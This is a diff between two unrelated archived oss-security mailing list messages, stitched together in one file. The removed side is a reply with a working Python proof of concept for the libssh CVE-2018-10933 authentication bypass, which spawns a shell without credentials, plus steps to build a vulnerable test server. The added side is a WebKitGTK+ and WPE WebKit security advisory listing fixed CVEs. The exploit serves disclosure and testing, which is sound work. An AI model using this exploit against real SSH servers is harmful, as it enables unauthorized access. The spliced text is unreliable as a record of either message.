@@ -1,76 +1,162 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/17/5
-Message-ID: <ec0cb776-0caf-c27e-dcff-ff68001900c2@gmail.com>
-Date: Wed, 17 Oct 2018 16:13:24 +0700
-From: Minh Tuan Luong <not.soledad@...il.com>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2018-10933: libssh: authentication bypass in server code
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/08/1
+Message-Id: <1533693619.3820.0@mail.igalia.com>
+Date: Tue, 07 Aug 2018 21:00:19 -0500
+From: Michael Catanzaro <mcatanzaro@...lia.com>
+To: webkit-gtk@...ts.webkit.org, webkit-wpe@...ts.webkit.org
+Cc: security@...kit.org, distributor-list@...me.org, oss-security@...ts.openwall.com, bugtraq@...urityfocus.com
+Subject: WebKitGTK+ and WPE WebKit Security Advisory WSA-2018-0006
 Content-Type: text/plain; charset=utf-8
 
-I have coded a simple POC for this CVE:
+------------------------------------------------------------------------
+WebKitGTK+ and WPE WebKit Security Advisory                WSA-2018-0006
+------------------------------------------------------------------------
 
---- CVE-2018-10933.py ----
+Date reported           : August 07, 2018
+Advisory ID             : WSA-2018-0006
+WebKitGTK+ Advisory URL : 
+https://webkitgtk.org/security/WSA-2018-0006.html
+WPE WebKit Advisory URL : 
+https://wpewebkit.org/security/WSA-2018-0006.html
+CVE identifiers         : CVE-2018-4246, CVE-2018-4261, CVE-2018-4262,
+                          CVE-2018-4263, CVE-2018-4264, CVE-2018-4265,
+                          CVE-2018-4266, CVE-2018-4267, CVE-2018-4270,
+                          CVE-2018-4271, CVE-2018-4272, CVE-2018-4273,
+                          CVE-2018-4278, CVE-2018-4284, CVE-2018-12911.
 
-import paramiko
-import socket
-import sys
+Several vulnerabilities were discovered in WebKitGTK+ and WPE WebKit.
 
-nbytes = 4096
-hostname = "127.0.0.1"
-port = 2222
+CVE-2018-4246
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.1.
+    Credit to OSS-Fuzz.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A type confusion issue was addressed with improved
+    memory handling.
 
-sock = socket.socket()
-try:
-     sock.connect((hostname, port))
-     # instantiate transport
-     m = paramiko.message.Message()
-     transport = paramiko.transport.Transport(sock)
-     transport.start_client()
+CVE-2018-4261
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to Omair working with Trend Micro's Zero Day Initiative.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
 
-     m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
-     transport._send_message(m)
+CVE-2018-4262
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to Mateusz Krzywicki working with Trend Micro's Zero Day
+    Initiative.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
 
-     cmd_channel = transport.open_session()
-     cmd_channel.invoke_shell()
+CVE-2018-4263
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to Arayz working with Trend Micro's Zero Day Initiative.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
 
-except socket.error:
-     print '[-] Connecting to host failed. Please check the specified 
-host and port.'
-     sys.exit(1)
+CVE-2018-4264
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to OSS-Fuzz, Yu Zhou and Jundong Xie of Ant-financial Light-
+    Year Security Lab.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
 
------
+CVE-2018-4265
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to cc working with Trend Micro's Zero Day Initiative.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
 
-to test this code: get vulnerable version of libssh at homepage: 
-https://www.libssh.org/files/0.7/libssh-0.7.4.tar.xz
-after uncompress and build, go to example directory, there's a simple 
-sshd server using libssh name: samplesshd-cb
+CVE-2018-4266
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to OSS-Fuzz.
+    A malicious website may be able to cause a denial of service. A race
+    condition was addressed with additional validation.
 
-run this simple sshd by command:
-     $ samplesshd-cb 127.0.0.1 -p 2222
-then run my code, output will be:
-Allocated session channel
-Allocated shell
-mean that i can bypass authentication and spawn a shell without any 
-credential
+CVE-2018-4267
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to Arayz of Pangu team working with Trend Micro's Zero Day
+    Initiative.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
 
-Regard, Soledad
+CVE-2018-4270
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to OSS-Fuzz.
+    Processing maliciously crafted web content may lead to an unexpected
+    application crash. A memory corruption issue was addressed with
+    improved memory handling.
 
-On 10/16/2018 7:21 PM, Marcus Meissner wrote:
-> Hi,
->
-> https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/
->
-> -----
-> libssh 0.8.4 and 0.7.6 security and bugfix release
->
-> This is an important security and maintenance release in order to address CVE-2018-10933.
->
-> libssh versions 0.6 and above have an authentication bypass vulnerability in the server code. By presenting the server an SSH2_MSG_USERAUTH_SUCCESS message in place of the SSH2_MSG_USERAUTH_REQUEST message which the server would expect to initiate authentication, the attacker could successfully authentciate without any credentials.
->
-> The bug was discovered by Peter Winter-Smith of NCC Group.
-> -----
->
-> This only affects libssh operating in _server_ mode, but not the usual used client mode.
->
-> Ciao, Marcus
+CVE-2018-4271
+    Versions affected: WebKitGTK+ before 2.20.2.
+    Credit to OSS-Fuzz.
+    Processing maliciously crafted web content may lead to an unexpected
+    application crash. A memory corruption issue was addressed with
+    improved input validation.
+
+CVE-2018-4272
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to OSS-Fuzz.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A memory corruption issue was addressed with
+    improved memory handling.
+
+CVE-2018-4273
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to OSS-Fuzz.
+    Processing maliciously crafted web content may lead to an unexpected
+    application crash. A memory corruption issue was addressed with
+    improved input validation.
+
+CVE-2018-4278
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to Jun Kokatsu (@shhnjk).
+    A malicious website may exfiltrate audio data cross-origin. Sound
+    fetched through audio elements may be exfiltrated cross-origin. This
+    issue was addressed with improved audio taint tracking.
+
+CVE-2018-4284
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to OSS-Fuzz.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A type confusion issue was addressed with improved
+    memory handling.
+
+CVE-2018-12911
+    Versions affected: WebKitGTK+ before 2.20.4 and WPE WebKit before
+    2.20.2.
+    Credit to Yu Haiwan.
+    Processing maliciously crafted web content may lead to arbitrary
+    code execution. A buffer overflow issue was addressed with improved
+    memory handling.
+
+
+We recommend updating to the latest stable versions of WebKitGTK+ and
+WPE WebKit. It is the best way to ensure that you are running safe
+versions of WebKit. Please check our websites for information about the
+latest stable releases.
+
+Further information about WebKitGTK+ and WPE WebKit security advisories
+can be found at: https://webkitgtk.org/security.html or
+https://wpewebkit.org/security/.
+
+The WebKitGTK+ and WPE WebKit team,
+August 07, 2018
 
